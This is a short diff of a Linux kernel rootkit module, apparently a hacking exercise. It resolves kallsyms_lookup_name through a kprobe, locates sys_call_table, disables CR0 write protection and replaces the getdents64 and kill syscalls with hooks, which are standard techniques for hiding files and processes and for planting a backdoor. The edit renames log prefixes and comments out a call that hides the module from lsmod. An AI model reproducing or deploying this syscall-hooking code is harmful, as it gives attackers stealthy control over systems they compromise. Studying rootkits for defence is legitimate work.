@@ -135,14 +135,14 @@ static int __init hacking_init(void)
     unregister_kprobe(&kp);
 
     if (!lookup_name) {
-        pr_err("[-] Failed to get kallsyms_lookup_name address.\n");
+        pr_err("[-hacking2600Module] Failed to get kallsyms_lookup_name address.\n");
         return -1;
     }
 
     // get syscall_table address from kallsyms_lookup_name function
     syscall_table = (uint64_t *) lookup_name("sys_call_table");
     if (!syscall_table) {
-        pr_err("[-] Failed to get sys_call_table address.\n");
+        pr_err("[-hacking2600Module] Failed to get sys_call_table address.\n");
         return -1;
     }
 
@@ -155,7 +155,7 @@ static int __init hacking_init(void)
     unsigned long original_cr0 = unprotect_memory();
     syscall_table[__NR_getdents64] = (uint64_t) new_getdents64;
     syscall_table[__NR_kill] = (uint64_t) new_kill;
-    hidelsmod();
+    // hidelsmod();
     protect_memory(original_cr0);
 
     return 0;
